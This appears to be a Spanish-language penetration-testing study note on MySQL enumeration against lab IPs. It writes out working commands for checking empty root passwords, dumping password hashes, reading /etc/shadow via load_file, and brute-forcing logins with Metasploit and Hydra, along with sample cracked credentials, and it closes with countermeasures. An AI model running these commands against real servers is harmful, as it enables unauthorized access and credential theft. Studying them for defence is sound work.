---
title: Enumeración MySQL
slug: enumeracion-mysql
aliases: [Enumeración MySQL]
fase: [Enumeración]
plataforma: Multi
dificultad: Intermedia
mitre: [T1046]
related: []
learning_refs: []
---

# Enumeración MySQL

## Descripción
MySQL es un sistema de gestión de bases de datos relacional open source que opera en el puerto 3306/tcp. La enumeración MySQL incluye: identificar la versión del servidor, detectar cuentas con contraseña vacia (especialmente root), realizar auditoría de configuración CIS, extraer hashes de contraseñas de los usuarios de la base de datos y ejecutar ataques de fuerza bruta. Con acceso y el privilegio FILE, MySQL puede leer archivos arbitrarios del sistema operativo subyacente (como /etc/shadow), lo que representa un vector de escalada de privilegios.

## Herramientas
- **nmap** (`mysql-info`, `mysql-empty-password`, `mysql-audit`, `mysql-databases`, `mysql-users`) — enumeración vía NSE
- **mysql** — cliente nativo para conexión directa y ejecución de consultas
- **Metasploit** (`mysql_version`, `mysql_enum`, `mysql_hashdump`, `mysql_login`) — enumeración y fuerza bruta
- **Hydra** — fuerza bruta de credenciales MySQL

## Comandos / Ejemplos

### Enumeración con Nmap NSE
```bash
# Informacion del protocolo y version
nmap 192.130.97.3 -p 3306 --script=mysql-info
# Resultado: version "5.5.62-0ubuntu0.14.04.1", protocolo 10

# Detectar cuenta root con contrasena vacia (misconfiguracion critica)
nmap 192.130.97.3 -p 3306 --script=mysql-empty-password
# Resultado: "root account has empty password"

# Auditoria CIS (Center for Internet Security)
nmap 192.130.97.3 -p 3306 --script=mysql-audit \
  --script-args="mysql-audit.username='root',mysql-audit.password='',mysql-audit.filename='/usr/share/nmap/nselib/data/mysql-cis.audit'"
# Verifica: load_data_local, symbolic_links, safe_user_create, skip_networking...

# Listar bases de datos (con credenciales)
nmap 192.130.97.3 -p 3306 --script=mysql-databases \
  --script-args="mysqluser='root',mysqlpass=''"

# Listar usuarios de MySQL
nmap 192.130.97.3 -p 3306 --script=mysql-users \
  --script-args="mysqluser='root',mysqlpass=''"
```

### Conexión directa y consultas SQL
```bash
# Conectar como root (con contrasena vacia)
mysql -h 192.130.97.3 -u root

# Conectar con contrasena
mysql -h 192.130.97.3 -u root -p

# Consultas de enumeracion dentro de MySQL:
SHOW databases;
USE mysql;
SELECT user, password FROM user;           -- hashes de contrasenas
SHOW variables LIKE 'secure_file_priv';   -- restriccion de lectura de archivos

# Lectura de archivos del SO (requiere privilegio FILE)
SELECT load_file("/etc/shadow");
SELECT load_file("/etc/passwd");
```

### Enumeración con Metasploit
```bash
# Detectar version sin credenciales
use auxiliary/scanner/mysql/mysql_version
set RHOSTS 192.51.166.3
run
# Resultado: "running MySQL 5.5.61-0ubuntu0.14.04.1 (protocol 10)"

# Enumeracion completa post-autenticacion
use auxiliary/admin/mysql/mysql_enum
set RHOSTS 192.51.166.3
set USERNAME root
set PASSWORD ""
run
# Resultado: version, OS, hostname, directorio de datos, hashes de todos los usuarios,
#            privilegios por usuario (FILE, SUPER, GRANT, RELOAD, SHUTDOWN, PROCESS)

# Volcar hashes de contrasenas
use auxiliary/scanner/mysql/mysql_hashdump
set RHOSTS 192.130.97.3
set USERNAME root
set PASSWORD ""
exploit
# Extrae: debian-sys-maint, filetest, ultra, guest, sigver, udadmin, sysadmin
```

### Fuerza bruta
```bash
# Metasploit
use auxiliary/scanner/mysql/mysql_login
set RHOSTS 192.127.56.3
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
exploit
# Resultado: [+] Success: 'root:catalina'

# Hydra
hydra -l root -P /usr/share/wordlists/metasploit/unix_passwords.txt 192.127.56.3 mysql
# Resultado: [3306][mysql] login: root password: catalina
```

## Contramedidas
- Nunca dejar la cuenta root de MySQL con contraseña vacia
- No exponer el puerto 3306 a internet; restringirlo a localhost o IPs de aplicación
- Aplicar principio de minimo privilegio: las cuentas de aplicación no deben tener privilegio FILE, SUPER ni GRANT
- Deshabilitar `local_infile` para prevenir lectura de archivos del cliente
- Usar `secure_file_priv` para restringir la ruta de LOAD DATA INFILE
- Mantener MySQL actualizado y auditar configuración con herramientas como mysql-audit

## Referencias
- Allen, M. (2022). *Mastering Kali Linux for Advanced Penetration Testing* (4th ed.). Packt Publishing.
- Rahalkar, S. (2017). *Metasploit for Beginners*. Packt Publishing.
- MITRE Corporation. (2024). ATT&CK Technique T1046: Network Service Discovery. https://attack.mitre.org/techniques/T1046/
